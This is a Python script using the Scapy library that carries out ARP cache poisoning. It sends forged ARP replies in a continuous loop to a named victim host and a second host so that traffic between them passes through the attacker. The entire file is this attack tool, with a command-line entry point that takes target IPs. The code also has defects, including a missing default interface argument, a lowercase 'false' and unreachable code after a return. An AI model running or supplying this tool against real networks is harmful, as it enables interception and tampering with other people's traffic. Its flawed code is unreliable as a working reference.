#!/usr/bin/env python

from scapy.all import *
from multiprocessing import Process
import sys, time

class ARPPoisoner(Process):
    def __init__(self, victimIp, usurpedIp, interface):
        super(ARPPoisoner, self).__init__()
        self.victimIp = victimIp
        self.usurpedIp = usurpedIp
        self.interface = interface
        self.getHwAddrVictim()
        self.kill = False
        self.getHwAddrUsurped()


    def __getHwaddr(self, ip):
        resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=10, verbose=0)
        for sended, received in resp:
            if received[ARP].hwsrc:
                return received[ARP].hwsrc
        return false;

    def getHwAddrVictim(self):
        self.victimHwAddr = self.__getHwaddr(self.victimIp)
        return (self.victimHwAddr)
        
    def getHwAddrUsurped(self):
        self.usurpedHwAddr = self.__getHwaddr(self.usurpedIp)
        return (self.usurpedHwAddr)

    def usurp(self):
        send(ARP(op=2, pdst=self.usurpedIp, hwdst=self.usurpedHwAddr, psrc=self.victimIp), verbose=0)
        send(ARP(op=2, pdst=self.victimIp, hwdst=self.victimHwAddr, psrc=self.usurpedIp), verbose=0)

    def run(self):
        try:
            while True:
                self.usurp()
        except KeyboardInterrupt:
            return;
        return;
        while not self.kill:
            self.usurp()
            time.sleep(5)

    def stop(self):
        self.kill = True
        send(ARP(op=2, pdst=self.usurpedIp, hwdst="ff:ff:ff:ff:ff:ff", psrc=self.victimIp, hwsrc=self.victimHwAddr), verbose=0)
        send(ARP(op=2, pdst=self.victimIp, hwdst="ff:ff:ff:ff:ff:ff", psrc=self.usurpedIp, hwsrc=self.usurpedHwAddr), verbose=0)
        print '\033[94m' + "[-]\tStopping ARP forwarder" + '\033[0m'

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('usage: ' + sys.argv[0] + ' VICTIM_IP USURPED_IP [interface]')
        print('eth0 is interface by default')
        exit(0);
    if len(sys.argv) == 4:
        poisoner = ARPPoisoner(sys.argv[1], sys.argv[2], sys.argv[3])
    else:
        poisoner = ARPPoisoner(sys.argv[1], sys.argv[2])
    print("Victim MAC Address: " + poisoner.victimHwAddr)
    print("Usurped MAC Address: " + poisoner.usurpedHwAddr)
    try:
        poisoner.run();
        threading.Event().wait()
    except KeyboardInterrupt:
        poisoner.stop();
        print("Leaving")
